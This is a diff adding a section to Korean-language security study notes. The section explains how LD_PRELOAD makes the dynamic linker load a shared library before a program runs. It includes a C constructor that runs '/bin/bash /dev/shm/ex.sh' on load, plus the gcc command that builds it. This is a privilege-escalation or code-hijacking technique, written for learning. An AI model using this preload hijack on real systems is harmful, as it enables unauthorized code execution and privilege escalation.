@@ -380,6 +380,31 @@ ldd /usr/bin/log-sweeper
 # 공유 라이브러리 만들기
 gcc -shared -fPIC ex.c -o ex.so
 ```
+
+## LD_PRELOAD
+### 동작방식
+```
+프로그램 실행
+    ↓
+동적 링커(ld.so)가 먼저 개입
+    ↓
+LD_PRELOAD에 지정된 .so를 메모리에 로드
+    ↓
+이때 constructor 함수가 자동 실행됨
+    ↓
+원래 프로그램 실행
+```
+```c
+// 라이브러리가 메모리에 올라오는 순간 자동 실행
+__attribute__((constructor))
+void init() {
+    system("/bin/bash /dev/shm/ex.sh");
+}
+```
+```bash
+# 공유 라이브러리 만들기
+gcc -shared -fPIC ex.c -o ex.so
+```
   
 </details>
 
